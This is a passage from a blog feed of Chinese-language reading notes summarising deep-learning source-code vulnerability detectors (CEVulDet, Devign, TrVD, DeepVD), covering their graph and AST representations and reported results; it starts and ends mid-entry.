gram模型和CBOW模型包含在Word2vec中。漏洞发现作业中最常用的单词嵌入方法是Word2vec[10]、[11]、[13]、[14]、[30]、[31]。Glove的主要想法是通过统计语料库中同时出现的单词的数量来收集有关全局单词的统计信息[32]。它是一个全局无监督对数双线性回归模型，用于描述无监督学习中的单词表示。Glove还用于表示具有代码函数[16]、[33]的单词嵌入。除了上述两个用于处理图[35]、[36]中节点中代码语句的单词嵌入之外，Doc2vec[34]还被用作程序表示的单词嵌入。研究[35]还发现，在JAVA语言漏洞检测工作中，TF-IDF[37]词向量嵌入方法的性能优于Doc2vec。</p><p><strong>Graph Neural Networks</strong></p><p>由于其卓越的性能和可解释性，图神经网络被广泛应用于推荐系统、知识图分类、文本分类等领域。由于表示学习和单词嵌入的成功，图嵌入和图神经网络已被应用于静态代码漏洞检测任务。图卷积神经网络、[38]门控图神经网络（以下简称GGNN[39]）和GAT是图神经网络的例子。GCN在图神经网络中加入了卷积层的概念，GGNN在图神经网中加入了门控递归单元，GAT在图神经网上加入了注意机制；GAT也是卷积图神经网络的一种。GGNN是一种广泛用于漏洞检测的图神经网络模型，用于提取图特征向量[13]，[14]，[15]，[40]。</p><p><strong>Domain Adaptation</strong></p><p>源域是描述领域自适应中当前先验知识的数据集，而目标域是需要算法学习新知识的数据集[41]。==域自适应的本质是源域和目标域之间的数据分布差异；==因此，数据特征分布自适应将是一个挑战。为了完成从源域到目标域的迁移操作，我们需要设计一种适当的测量方法，该方法能够自适应地估计数据分布的多样性，并不断缩小它们之间的差距。当标签明显缺失时，现在解决不同数据集之间的模型转移是一个关键概念。领域对抗性神经网络（以下简称DANN）[42]是一种领域自适应，它将对抗性机制添加到神经网络的训练中，由三部分组成：特征提取器、分类器和领域鉴别器。特征提取器，通常是神经网络模型，从源域和目标中的数据中提取特征向量；该分类器接受特征向量并将其用于下游分类任务。领域鉴别器决定输入图特征属于哪个领域。DANN有两个目标：一是减少代码分类器的分类误差，二是增加领域的分类误差。DANN被认为是在数据分布自适应的背景下进行边缘分布自适应的一种对抗性策略。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CEVulDet A Code Edge Representation Learnable Vulnerability Detector</title>
      <link href="/2023/12/18/Papers/Vul/CEVulDet/"/>
      <url>/2023/12/18/Papers/Vul/CEVulDet/</url>
      
        <content type="html"><![CDATA[<h1 id="0-abstract">0 Abstract</h1><p>许多研究者已开始应用深度学习算法来检测源代码的漏洞。然而，现有方法的检测结果仍然不够准确。大多数这些方法将程序源代码直接视为自然语言。这些方法可能会忽略特定于程序代码的结构信息，而这些信息是代码构成语义的关键部分。在本文中，我们提出了一种名为CEVulDet的新型漏洞检测方法。**首先，我们采用中心性分析来从PDG中去除不重要的节点，以获得保留程序重要部分的新图。其次，我们提出了一种新的程序语义提取方法，该方法获取特征向量以表示程序代码和图边信息的语义信息。它可以借助模型解释技术定位漏洞触发路径。**最后，我们的方法提取的向量被输入到CNN中训练漏洞检测器。在我们的实验中，我们评价了CEVulDet在一个包含33,360个函数的数据集上的性能，其中包括12,303个有漏洞的函数和21,057个无漏洞的函数。实验结果表明，CEVulDet远远优于基于规则的检测器，并超越了最先进的基于深度学习的检测器。CEVulDet在准确率、精确度、召回率和F1指标方面分别提高了3.2%、3.4%、5.1%和4.2%。</p><h1 id="1-intro-or-overview">1 Intro or Overview</h1><h2 id="11-problem-and-challenge">1.1 Problem and Challenge</h2><h2 id="12-motivation">1.2 Motivation</h2><p>我们的主要目标是准确地将一个函数代码标记为易受攻击或不易受攻击。为了做到这一点，我们以两种方式提高模型的准确性。一方面，我们需要使模型能够专注于函数的重要部分。另一方面，必须以适当的方式从源代码中提取丰富的语义。</p><p>为了让模型关注函数的重要部分。我们使用中心性分析来计算函数代码中每行代码的重要性，然后提取重要的代码行。函数代码中的不同代码行具有不同级别的语义重要性。例如，有些代码仅仅声明或定义变量，而其他代码实现了函数的核心算法。显然，后者对函数更重要，因为它们是函数语义的主要部分。获取这些关键代码（即高重要性代码）有助于模型做出更准确的判断。中心性分析计算图中节点的中心性值，这些值反映了图中节点的重要性。我们对函数进行静态分析，获取相应的PDG，然后使用中心性分析计算图中每个节点的中心性值。PDG中的每个节点对应函数中的一行代码，因此我们得到每行代码的重要性。</p><p>在这里，我们将度值视为度中心性，并计算其度中心性值，以弱点函数为示例。如图1所示，PDG中每个节点的内容是一行代码，在图中的实线和虚线表示代码之间的控制流和数据流。我们计算了图中每个节点的入度、出度和度，得到了表I。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221508383.png" alt="image-20240422150829338" style="zoom:50%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221508930.png" alt="image-20240422150839897" style="zoom:50%;" /><p>从表格I中，我们可以看到不同代码行的度基本不同，因为代码行之间有不同的关系（即控制流和数据流），这在一定程度上可以反映出代码行的重要性。为了更全面地考虑每行代码的重要性，我们使用三种不同的中心性分析（即度中心性[8]、接近中心性[8]和PageRank中心性[9]）。</p><p>从源代码中提取丰富的语义。我们提出了一个新颖的想法，可以从源代码中提取更丰富的语义意义。我们观察到，大多数先前的方法只是简单地堆叠代码行，然后将它们馈送到神经网络模型中。它们忽略了函数中的一些逻辑结构，特别是函数代码中的控制流和数据流，函数中的漏洞是基于这些流触发的。这些结构（即控制流边和数据流边）存在于与函数对应的PDG中。因此，我们提出了代码边，其中代码边对应于PDG中的一条边，由该边的两个节点组成。通过这种方式，我们可以将函数转换为代码边列表并获得语义丰富的数据。我们已经结合了这两个方面，并实施了CEVulDet，这使得能够更准确地检测函数（即易受攻击或不易受攻击）。</p><h2 id="13-contribution">1.3 Contribution</h2><p>我们使用中心性分析来拦截函数中的重要代码行，让神经网络模型专注于函数的重要部分。</p><p>我们提出了一种新颖的特征提取方法，能够从PDG中提取更丰富的语义（即控制流和数据流），并将函数转换为代码边缘列表。可解释的分析能帮助我们在一定程度上发现漏洞触发的路径。</p><p>我们实现了我们的漏洞检测器并将其与其他几种先进的检测方案进行比较。我们的方法在SARD [10]上取得了最佳结果。</p><h1 id="2-architecture-method">2 Architecture &amp; Method</h1><h2 id="21-system-overview">2.1 System Overview</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221519579.png" alt="image-20240422151938485"></p><ul><li><p>获取代码的PDG：我们对每个函数的源代码进行规范化，然后进行静态分析以提取该函数的程序相关图。</p></li><li><p>生成中心图：PDG使用图的中心性值来删除程序相关图中的不重要节点，从而获得中心图。</p></li><li><p>生成代码边列表：我们使用中心图生成代码边缘列表，列表的每一行包含图中一个有向边的两个节点。</p></li><li><p>将代码边列表转换为向量列表：我们将一行代码视为一个句子，并遵循将句子嵌入向量的方法，同时将代码边嵌入向量中。</p></li><li><p>分类：最后，我们选择使用CNN模型构建我们的分类器，并将其用于检测漏洞。</p></li></ul><h2 id="22-method">2.2 Method</h2><p>代码边定义：</p><p>函数的程序依赖图包含其控制流和数据流，函数内代码行之间的逻辑关系嵌入在这两种流中。这些流（即控制流和数据流）在程序依赖图中被具体表示为有向边（例如，图1中的实线和虚线）。</p><p>考虑一个函数 f 的 PDG G = (V, E)，其中 V = {n1, …, nk} 是一组节点。一个节点对应于函数中的一行代码。E = {e1, …, ek} 是一组有向边，每条边代表一对节点之间的数据或控制依赖关系。使用代码边来表示PDG中的有向边，并且我们将有向边看作是两个节点之间的方向关系。因此，在PDG的Eei中，代码边缘ei = [nis，nie]由ei的起始节点和结束节点组成。因此，代码边在PDG中包含两个节点（即两行代码），这两个代码节点可能存在数据依赖性、控制依赖性，或者两者兼有。每个节点都包含函数中相应的代码行。请注意，这些边是有向边，这意味着节点“a”指向“b”的语义与节点“b”指向“a”的语义完全不同</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221547446.png" alt="image-20240422154739402" style="zoom:50%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404221552952.png" alt="image-20240422155240908" style="zoom:50%;" /><h1 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h1><h2 id="31-dataset-and-process">3.1 DataSet and Process</h2><h2 id="32-evaluation">3.2 <strong>Evaluation</strong></h2><h1 id="4-discusion">4 Discusion</h1><h2 id="conclusion">Conclusion</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Devign基于GNN的源代码漏洞检测</title>
      <link href="/2023/12/18/Papers/Vul/Devign/"/>
      <url>/2023/12/18/Papers/Vul/Devign/</url>
      
        <content type="html"><![CDATA[<p>Devign: Effective Vulnerability Identification by Learning Comprehensive Program Semantics via Graph Neural Networks：NIPS(A) 2019，Yaqin Zhou et al.</p><h2 id="0-abstract">0 Abstract</h2><p>本文提出了Devign模型，一个基于GNN的源代码漏洞检测模型，使用GNN学习丰富的代码语义信息。该模型包括一个Conv模块，其功能是提取有用的特征来进行graph-level的分类。该模型在4个大型开源C项目上进行训练和测试，结果表明Devign明显优于现有技术，平均提高了10.51%的准确率和8.68%的F1值。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h4 id="11-problem-and-challenge">1.1 Problem and Challenge</h4><h4 id="12-motivation">1.2 Motivation</h4><h4 id="13-contribution">1.3 Contribution</h4><p>本文提出了一种基于复合代码表示的图神经网络模型Devign，可以对程序语义信息进行完整的提取，用以各种捕捉漏洞特征。在复合代码表示中，以AST为中心，将不同级别的数据依赖和控制依赖编码为联合图，其中不同类型的边代表不同的依赖特征。这种复合代码表征综合了各种信息，尽可能广泛的捕捉漏洞类型和漏洞模式，使得GNN能够更好的学习节点表征。</p><p>提取复合代码表征后，经过门控GNN模块，通过对邻接节点信息的聚合和传递来得到各个节点的表征。最后，经过Conv模块选择与当前任务相关的节点和特征集合，应用一维卷积和dense层来对节点特征进行提取从而实现图级别的分类。</p><p>另外，为了验证复合程序编码表征的作用，以及使用GNN进行漏洞检测的效果，本文从4个流行的C库中收集人工标记数据集来进行实验。实验结果表明，Devign比现有方法平均提高了10.51%的准确率和8.68%的F1值，而Conv模块带来了4.66%的精度和6.37%的F1值，将Devign应用到从4个项目中收集到的40个最新的CVE中，得到了74.11%的准确率，在发现新漏洞方面体现了该模型的可用性。</p><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h4 id="21-system-overview">2.1 System Overview</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403062129788.png" alt="image-20240306212907717"></p><p>上图是Devign的整体架构，包含三个顺序的部分，首先是复合代码语义embedding层，该层将源代码编码为具有多种代码语义的联合图结构；**第二部分是GNN层，该层通过聚集和传递图中相邻节点的信息来学习节点的特征；**第三部分是Conv模块，提取有意义的节点表征用于图级别的分类预测。</p><ul><li>复合代码表征</li></ul><p>程序分析中的各种程序表示被用来显示程序的内在信息，比如AST，CFG，DFG（数据流图）等等捕捉了源代码的语法和语义关系。很多漏洞不考虑复合代码语义就无法发现，比如有研究表明，仅仅使用AST可以查找不安全参数的漏洞，而将AST与CFG结合则可以查找资源泄露和释放后使用漏洞。进一步，将AST，CFG，DFG联合使用，则可以检测多种类型的漏洞。</p><p>除了以上的三种经典的代码结构，Devign还考虑了源代码序列本身，因为它的flatten结构能以一种“人类可读”的方式捕获代码token之间的联系。接下来分别介绍各种类型的代码表示，以及如何将个各种子图表示为一个联合图。下图(a)是整数溢出代码示例，(b)是图表示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403062139644.png" alt="image-20240306213943562"></p><ul><li>GNN层</li></ul><p>图神经网络的核心思想是通过对相邻节点的信息进行聚合来embedding节点表征，本文使用门控递归图网络来学习节点表征。和正常的GNN一样，通过邻接矩阵来对邻接节点的信息进行聚合，将聚合节点和当前节点一起经过GRU网络得到下一时刻的当前节点。以此类推，经过T时刻，生成所有节点的最终的节点表征。</p><ul><li>Conv层</li></ul><p>图分类的标准方法是将所有的节点特征线性的输入到MLP中然后通过softmax分类，这种方法没有注重重点。Conv模块用来选择与当前任务相关的节点和特征集合，应用一维卷积和dense层来对节点特征进行提取从而实现图级别的分类。</p><h3 id="evaluation">Evaluation</h3><ul><li>Q1：Devign相比其他源代码漏洞检测方法，效果如何？</li><li>Q2：Conv模块与普通的flatten的节点融合相比，有什么优势？</li><li>Q3：复合图特征学习相比单一图有哪些优势？</li><li>Q4：在真实场景中，相比于静态分析器，Devign是否有更好的性能？</li><li>Q5：在CVE公开报告的最新漏洞上，Devign的表现如何？</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403062148291.png" alt="image-20240306214821244"></p><p>上图是本文使用的数据集示例，本文评估了从4个大型C语言开源项目中收集的手工标记的函数，这些项目在开发人员中很流行，并且功能多样，例如Linux Kernel, QEMU, Wireshark和FFmpeg。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403062149478.png" alt="image-20240306214938378"></p><p>本文利用基于代码属性图的C/C++开源代码分析平台Joern来提取数据集中所有函数的AST和CFG，上图中的Ggrn意思是普通的flatten的节点融合。将DFG图分为3个子图，DFG_C表示变量的定义，DFG_R表示变量的最近一次读，DFG_W表示变量的最后一次写。下图展示了Devign模型与BiLSTM，BiLSTM-Attention，CNN，以及两种静态方法进行比较的实验结果。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403062149491.png" alt="image-20240306214951439"></p><p>下面回答之前提出的5个问题：</p><ul><li>Q1：可见Devign相比其他的模型，准确率和F1值都有明显的提高</li><li>Q2：Devign模型与Ggrn模型相比，准确率平均提高3.23%，F1值平均提高3.92%，说明Conv模块提取了更多相关节点和特征用于图级分类</li><li>Q3：对于Ggrn模型，复合图和单一图的区别不大，而对于Devign模型，复合图的效果优于单一图</li><li>Q4：本文创建了一个具有10%漏洞的不平衡数据集，将Devign与著名的开源静态分析工具Cppcheck、Flawfinder和商业工具CXXX进行比较，Devign的F1平均值显著提高，提升幅度达到了27.99%</li><li>Q5：本文分别提取了各个项目的最近的10个CVE漏洞来检查Devign是否可以识别0-day漏洞。通过对40个CVE漏洞的提交修复提取得到112个漏洞函数，将这些函数输入到经过训练的Devign模型中，平均准确率达到了74.11%，显示了Devign在实际应用中发现新漏洞的潜力。</li></ul><h3 id="conclusion">Conclusion</h3><p>本文提出了一种基于复合代码表示的图神经网络漏洞检测模型Devign, 该模型首先生成联合图提取图节点的复合代码表征，然后通过GNN对邻接节点的信息进行聚合来学习节点特征，最后通过Conv模块选择与当前任务相关的节点和特征集合，通过一维卷积和dense层来进行图级别的分类检测。以函数为检测粒度，针对C代码。</p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><h2 id="4-conclusion">4 Conclusion</h2><h2 id="summary">Summary</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trvd Enhancing vulnerability detection via AST decomposition and neural sub-tree encoding</title>
      <link href="/2023/12/18/Papers/Vul/Enhancing%20vulnerability%20detection%20via%20AST%20decomposition%20and%20neural%20sub-tree%20encoding/"/>
      <url>/2023/12/18/Papers/Vul/Enhancing%20vulnerability%20detection%20via%20AST%20decomposition%20and%20neural%20sub-tree%20encoding/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>软件漏洞的爆炸性增长对系统安全构成了严重威胁，已成为当今亟待解决的问题之一。然而，现有的漏洞检测方法在达到检测准确性、效率和适用性之间的平衡方面仍然面临局限性。遵循分而治之的策略，本文提出了TrVD（基于抽象语法树分解的漏洞检测器）来揭示源代码片段中隐含的指示语义，以实现准确高效的漏洞检测。为了便于捕捉细微的语义特征，TrVD使用一种新的分解算法将代码片段的AST转换为大小和深度受限的有序子树集。因此，通过精心设计的树结构神经网络，可以有效地收集每个子树的语义。最后，使用Transformer风格的编码器将所有子树的长程上下文语义聚合到一个特定于漏洞的向量中，以表示目标代码片段。在由不同的真实世界和合成漏洞样本组成的五个大型数据集上进行的广泛实验证明了TrVD在检测漏洞存在和确定漏洞类型方面相对于SOTA方法的性能优势。消融研究也证实了TrVD核心设计的有效性。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h3 id="11-problem-and-challenge">1.1 Problem and Challenge</h3><h4 id="可用性">可用性</h4><p>其他被广泛采用的代码表示包括CFG、PDG和各种基于图形的变体。这些表示更明确地描述了代码元素之间的控制或数据依赖关系，然而，当面对不可执行或不完整的代码片段时，很难精确推导出这些依赖关系。因此，它们可能并不总是适用于漏洞检测。按照约定，AST可以很容易地为任何代码片段构建，例如文件、函数或单个语句。</p><h4 id="效率">效率</h4><p>与需要相对复杂和耗时的控制或依赖性分析的代码表示（例如CFG、PDG和代码小工具）相比，从代码构建AST要简单得多，重量轻，从而有助于提高整个检测方法的效率。</p><h4 id="语义综合性">语义综合性</h4><p>那些人工创建的代码表示（例如，PDG和XFG）倾向于强调代码的特定方面，例如控制流或数据依赖关系。然而，它们经常在转换过程中丢失一些重要信息，这会导致语义损失，尤其是在表示不完整的代码片段时。不同的是，AST使源代码具有高度结构化的性质，其中关于语句和表达式的底层语法是直接可用的；也就是说，AST提供了更全面、更丰富、更精确的代码语义，使TrVD不遗漏任何可疑的漏洞含义，提高了检测的准确性。</p><h3 id="12-motivation">1.2 Motivation</h3><p>如前所述，为了充分利用AST的潜力并有效应对其使用带来的挑战（这对漏洞检测能力产生了重大影响），TrVD遵循了经典的分而治之策略。</p><p>Divide</p><p>使用基于图/树的神经网络编码整个AST，如GCN、GAT、tree LSTM和TBCNN，在处理大型/深层树结构时，使用过平滑嵌入捕获长程依赖性可能会大大降低。由于资源限制，这些耗费时间和内存的模型直接处理这样大/深的AST也是非常不可行的。在这方面，<mark>TrVD选择通过分解算法将整个AST划分为有序的子树集，每个子树对应于原始代码片段中的细粒度完整代码单元</mark>。这产生了两个优点：（1）每个子树包含有限（小得多）数量的节点和可控的树深度，并且可以由通用树或图神经网络以成本低廉的方式进行操作；以及（2）更重要的是，这提供了一个机会，通过关注大小受限的本地代码单元来更好地掌握指示漏洞信息的微妙语义，否则可能很容易被忽视。</p><p>Conquer</p><p>TrVD采用“先综合获取后关键点聚焦”的方案，实现对指示性和可疑漏洞语义的有效提取。具体来说，TrVD首先用新设计的树结构神经网络处理每个子树，将其对应代码单元的语义映射到数字向量中。基于所学习的子树嵌入，TrVD然后利用基于Transformer的主干来不同地关注越来越不重要的子树，以发现具有自注意机制的漏洞模式，并将所有子树的长程上下文语义融合到密集的、特定于漏洞的数字向量中，以表示目标代码片段。从这个意义上说，TrVD在代码表示学习中的方式类似于基于切片的方法，其中通过根据兴趣点对相关语句进行切片而生成的代码小工具（例如，库/API函数）通过常规NLP模型（例如LSTM）容纳有助于学习局部特征和帮助精确定位漏洞模式的信息。但是，在TrVD中细化的子树更结构化，不那么模糊，而为注意力增强子树聚合而设计的Transformer能够更好地嵌入上下文，以提高漏洞检测性能。</p><h3 id="13-contribution">1.3 Contribution</h3><ul><li>我们提出了一种新的漏洞检测方法，称为TrVD，在每个公式化阶段都经过精心设计，使其成为一种准确、高效、更实用的方法，适用于代码片段。具体而言，为了提高其检测隐藏良好的漏洞和特定漏洞类型的能力，它结合了新的AST分解、注意力增强子树编码和上下文感知语义聚合，从而能够从目标代码片段中提取微妙但特定于漏洞的语义，据我们所知，在基于DL的漏洞检测工作中尚属首次。</li><li>我们进行了大量的实验来评估TrVD的性能、不同组成模块的有效性以及运行时开销。实证研究表明，在大多数数据集上，TrVD在检测漏洞的存在或识别特定漏洞类型方面的准确性、F1和精度优于最先进的基于DL的方法。TrVD核心设计的优势，如AST分解和子树编码，也通过消融研究得到了证实。</li><li>我们提供了一个新的数据集来促进漏洞检测研究。该数据集包含264822个C/C++函数，每个函数都标有特定的CWE ID或非易受攻击的基本事实。TrVD实现的数据集和源代码已在https://github.com/XUPT-SSS/TrVD，以促进未来的基准测试或比较。</li></ul><p>AST分解，注意力增强子树编码，上下文感知语义聚合，</p><p>新数据集</p><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h3 id="21-system-overview">2.1 System Overview</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403042035978.png" alt="image-20240304203524892"></p><p>目标源代码片段依次通过五个主要模块进行处理：</p><p>（1）AST生成器，它以语义保持的方式对代码片段进行规范化，并使用解析器构建其AST；</p><p>（2） AST分解器，使用分解算法将AST转换为有序的子树集；</p><p>（3） 综合语义收集器，通过树结构的神经编码器，将每个子树中传递的语义迭代提取为实值向量；</p><p>（4） 可疑语义焦点，它将所有收集到的子树语义聚合到一个上下文化的嵌入向量中，该嵌入向量通过基于Transformer的模型处理更具漏洞特定性的语义；</p><p>（5） 漏洞检测器，它实现了一个多层感知器（MLP），该感知器具有用交叉熵损失训练的softmax层来预测输出。</p><h4 id="ast-decomposer">AST decomposer</h4><h4 id="单个令牌序列">单个令牌序列。</h4><p>遍历算法通常用于将AST展平为记号序列，包括前序遍历（Tang，Shen et al.，2022；Zhang，Wang，Zhang，Sun，&amp;Liu，2020）和中序遍历（Svyatkovskiy，赵，Fu，&amp;Sundaresan，2019）。为了避免信息丢失，SBT（Hu，Li，Xia，Lo，&amp;Jin，2018）和SPT（Niu et al.，2022）通过添加额外的符号来指示父子关系，进一步改进了这些方法，以确保线性化的序列可以明确地映射回AST，然而，这会使序列变得更大。另一种方法code2seq（Alon，Levy，&amp;Yahav，2019）将叶节点之间收集的采样路径连接起来，形成单个令牌序列，该序列通常太长，神经编码器无法有效处理语义提取，尤其是漏洞检测任务。</p><h4 id="令牌序列集">令牌序列集。</h4><p>PathTrans（Kim，赵，Tian，&amp;Chandra，2021）将AST映射到一组根路径，每个根路径由通过从叶节点向上遍历根或从根向下遍历叶节点而获得的令牌组成（Jiang，Zheng，Lyu，Li，&amp;Lyu，2021），并指出特定代码元素（即叶节点）所在的纵向上下文。根路径可以用作学习令牌嵌入的输入；然而，由于每条路径只包含零碎的代码元素，从中学习到的不完整语义可能会降低训练和检测性能。</p><h4 id="子树">子树。</h4><p>ASTNN（Zhang et al.，2019）和Infercode（Bui，Yu，&amp;Jiang，2021）等方法不是将AST线性化为标记序列，而是将其分解为一组子树，以利用句法结构。采用不同的粒度来分割AST，其中ASTNN生成与代码语句相对应的非重叠子树，而Infercode生成与表达式等较小代码元素相对应的具有重叠的子树。</p><p>该论文的分解器：</p><p>给定根节点，它通过访问者和构造函数递归地划分子树。访问者沿着AST执行先序遍历，将每个节点传递给构造函数，用于节点类型检查、复合语句分解和子树构建，其中构建的子树按顺序附加到集合中。这里，最终集合中每个子树的顺序由其对应代码在原始代码片段中的位置决定。图中给出了一个示例。3有助于理解我们的AST分解算法及其与ASTNN的区别。更具体地说，以图3（a）中的归一化代码为输入，我们的算法将其AST分解为12个子树，按其在代码中的出现顺序排列。与ASTNN相比，我们的算法的差异也得到了说明：对于代码中从第6行到第10行的if复合语句，我们的方法生成一个集成子树，而ASTNN将其拆分为三个子语句的平凡子树，如图中蓝色虚线所示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403192205858.png" alt="image-20240319220539749"></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404182057753.png" alt="image-20240418205716678" style="zoom: 50%;" /><h4 id="算法解释">算法解释</h4><p><strong>输入参数：</strong></p><ul><li><p>T：输入的抽象语法树（AST）。</p></li><li><p>α：子树的最大深度限制。</p></li><li><p>β：子树中允许的最大节点数限制。</p></li><li><p>C：一个包含特定类型语句的列表，这些语句被认为是复合语句。</p></li></ul><p><strong>输出：</strong></p><ul><li>D：一个有序的子树集合。</li></ul><p>TREESPLITTING 函数：这是算法的核心函数，它递归地遍历AST，并根据给定的参数将树分解成子树。</p><p><strong>初始化：</strong></p><ul><li>node：从当前树 t 获取根节点。</li></ul><p><strong>处理语句节点：</strong></p><ul><li>如果 node 是一个语句节点（即不是复合语句），并且它不在复合语句类型列表 C 中：<ul><li>如果节点的大小（trSize(node)）小于 α 并且深度（trDepth(node)）小于 β：<ul><li>构造一个以 node 为根的子树，并将其添加到子树集合 D。</li><li>使用 subTreeConstructor 函数构造子树。</li></ul></li><li>否则：<ul><li>构造一个以 node.header 为根的子树，并将其添加到 D。</li></ul></li></ul></li></ul><p><strong>递归处理子节点：</strong></p><ul><li>对于 node 的每个子节点 child：<ul><li>递归调用 TreeSplitting 函数，将 child、D、α、β 和 C 作为参数。</li></ul></li></ul><p><strong>处理复合语句节点：</strong></p><ul><li>如果 node 是复合语句（即在列表 C 中）：<ul><li>对于 node 的每个子节点 child：<ul><li>递归调用 TreeSplitting 函数。</li></ul></li></ul></li></ul><p><strong>结束函数：</strong></p><ul><li>函数结束时返回子树集合 D。</li></ul><p><strong>复合语句类型列表</strong> C 包含了被认为是复合语句的类型，如函数定义、if、for、while、do-while、switch、try 和 catch。</p><p><strong>算法调用：</strong></p><p>最后，算法通过调用 TreeSplitting(T, D, α, β, C) 来启动，其中 T 是初始的AST。</p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><h2 id="4-conclusion">4 Conclusion</h2><h2 id="summary">Summary</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeepVD Toward Class-Separation Features for Neural Network Vulnerability Detection</title>
      <link href="/2023/12/18/Papers/Vul/DeepVD%20Toward%20Class-Separation%20Features%20for%20Neural%20Network%20Vulnerability%20Detection/"/>
      <url>/2023/12/18/Papers/Vul/DeepVD%20Toward%20Class-Separation%20Features%20for%20Neural%20Network%20Vulnerability%20Detection/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>包括深度学习（DL）在内的机器学习（ML）的进步使几种方法能够隐式学习易受攻击的代码模式，从而自动检测软件漏洞。最近的一项研究表明，尽管取得了成功，但现有的基于ML/DL的漏洞检测（VD）模型在区分两类漏洞和良性代码方面的能力有限。我们提出了DEEPVD，这是一种基于图的神经网络VD模型，强调漏洞和良性代码之间的类分离特征。DEEPVD在不同的抽象级别上利用了三种类型的类分离功能：**语句类型（类似于词性标记）、后支配树（涵盖常规执行流）和异常流图（涵盖异常和错误处理流）。**我们使用13130种易受攻击的方法，在303个项目的真实世界漏洞数据集中进行了几个实验来评估DEEPVD。我们的研究结果表明，与最先进的基于ML/DL的VD相比，DEEPVD的准确率相对提高了13%–29.6%，召回率为15.6%–28.9%，F评分为16.4%–25.8%。我们的消融研究证实，我们设计的功能和组件有助于DEEPVD实现漏洞和良性代码的高度可分离性。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h4 id="11-problem-and-challenge">1.1 Problem and Challenge</h4><p>提出了DEEPVD，这是一种基于图的神经网络VD模型，其目标是利用强调脆弱性和良性类别之间的类分离的特征。我们以以下见解设计DEEPVD。首先，当程序通过一个方法执行时，执行可以以两种方式进行：1）从方法m的开始到m的出口点的规则流，以及2）从m开始到异常/错误处理点的异常/错误操作流。漏洞的主要原因之一是对异常和错误案例的处理不当。例如，程序可能会在输入的数据验证中遗漏一个案例，从而导致通过精心编制的输入进行注入攻击（第二节）。因此，对于方法m，我们捕获从m的输入到异常/错误处理点的程序切片。这些切片被组合成一个数据结构，称为异常流图（EFG）[20]。EFG预计由关键程序元素及其依赖项组成，这些元素与异常/错误的错误处理有关，从而导致漏洞。</p><p>其次，在使用EFG来处理程序中的异常流时，我们还考虑了规则流的每个方法的后支配树（PDT）[21]。<mark>PDT是一个树，其中每个节点表示一个语句，每个边表示后优势关系。如果从s开始到方法出口点的所有路径都必须经过d，则语句d被视为另一个语句s的后支配者。虽然PDT比CFG更简单，但它可以帮助模型学习在通往出口点的规则流中s和d的执行之间的关联。如果d崩溃，s的执行路径将永远不会到达出口点。</mark></p><p>第三，根据Checkmarx[22]的漏洞分析，漏洞代码通常涉及特定的语法类型。因此，我们用一种相当于自然语言处理（NLP）中的词性（POS）标记的技术来增强EFG。POS标记已被证明可以提高下游NLP任务（文本到语音转换[23]、名称实体识别[24]等）的性能。这种标记也应用于代码补全，以实现高精度[25]。对于图表示中的每个语句节点，我们将其与一个语句类型相关联，<strong><mark>因为漏洞通常与特定的语句类型相关，例如数组声明/引用、指针声明/引用，赋值和表达式</mark></strong>[14]，[22]。语句类型补充了EFG和PDT捕获的语义依赖关系，并改进了类分离。EFG和PDT被编码并馈送到VD的标签图卷积网络（标签GCN）[26]和树LSTM[27]中。</p><h4 id="12-motivation">1.2 Motivation</h4><h4 id="13-contribution">1.3 Contribution</h4><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h4 id="21-system-overview">2.1 System Overview</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403212102060.png" alt="image-20240321210200935"></p><p>1） 